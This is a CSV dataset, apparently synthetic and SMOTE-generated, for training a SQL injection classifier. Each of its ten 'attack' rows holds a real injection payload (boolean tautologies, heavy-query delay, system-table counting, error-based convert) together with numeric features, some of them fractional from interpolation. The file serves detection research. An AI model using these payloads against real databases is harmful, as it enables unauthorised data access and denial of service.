id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,1   )    )    and 9198  =  9198--,nearest_attack_euclidean,R001982,0.45982866105175474,30.922312882163666,10.0,2.608405686300292,3.0,9.0,14.219125327568861,4.703187554594811,0.09817373118124587,0.2945211935437376,0.455098053257755,0.15220702201726152,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,1.7031875545948099,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000002,attack,boolean,"1   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001514,0.027521676134903368,245.71077424144306,36.0,3.6661642201680693,72.0,27.0,103.6441670223649,43.06660721907819,0.293336470436478,0.11000117641367925,0.4213900348101225,0.17527231833972026,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,24.066607219078193,0.0,2.0,4.0,13.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000003,attack,boolean,"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001815,0.0472477561346956,261.83386646180765,39.0,3.8393502641271984,77.73354658472306,35.0,104.97806211296407,44.12225776412051,0.2968463551673959,0.1337176877459683,0.4008891473754219,0.16854680971121394,0.0,1.0,2.0,0.0,0.0,2.0,0.0,23.122257764120505,0.0,2.0,4.0,14.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000004,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R002746,0.07075850799884492,116.0,27.31439571913939,4.115230370122054,73.0,3.0000000000000018,27.000000000000004,13.0,0.6293103448275862,0.025862068965517238,0.23275862068965517,0.11206896551724138,3.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,3.000000000000001,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,boolean,"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001510,0.03145765266963341,247.27296636174796,38.0,3.7135404792840716,72.0,27.0,103.39413863478997,44.878827726957994,0.29121696319631885,0.10920636119861954,0.41807951544228616,0.1814971601627755,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,23.878827726957994,1.0,2.0,4.0,13.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000006,attack,boolean,"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000798,0.08970627418293296,159.41384642994336,36.0,4.3164875035314125,80.06038482245754,17.0,44.35346160748584,18.0,0.5020782000153424,0.10670052151238427,0.27824425569445466,0.11297702277781863,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,3.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000007,attack,boolean,"1""  )   as pydh where 3407  =  3407 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R001155,0.4737743447216123,207.789843751527,32.789843751526995,3.7362669632462535,120.0,20.0,51.0,16.789843751527,0.5775087966791332,0.09625146611318888,0.24544123858863162,0.08079849861904628,0.0,0.7898437515269973,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,6.0,5.0,0.0,0.7898437515269973,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000008,attack,boolean,-3634%'   )    )    or 2671  =  2434,nearest_attack_euclidean,R002339,0.40646858189788343,34.080411151582936,13.451546043309406,2.9629678034058906,2.0,12.0,14.354638129928219,5.725773021654703,0.05923292882838521,0.35539757297031116,0.41712681441770993,0.16824268378359367,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,1.7257730216547031,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000009,attack,boolean,hi' or 'a'  =  'a,nearest_attack_euclidean,R000258,2.0727181095851153,19.248172153398116,9.798537722718496,2.8337074599911616,6.449634430679623,0.8992688613592463,6.0,5.899268861359248,0.33731217219562803,0.04087585733451127,0.3168742435283724,0.3049377269414883,4.449634430679624,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.44963443067962394,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000010,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu",nearest_attack_euclidean,R001621,0.5348626032323652,374.5415252875328,31.0,3.3816974191365903,105.74237283183012,47.0,169.11355924774517,52.685593207957524,0.2823095434501519,0.12551034637692976,0.45150386064241427,0.14067624953050406,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.314406792042472,0.0,35.371186415915055,0.0,0.0,1.0,12.314406792042472,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
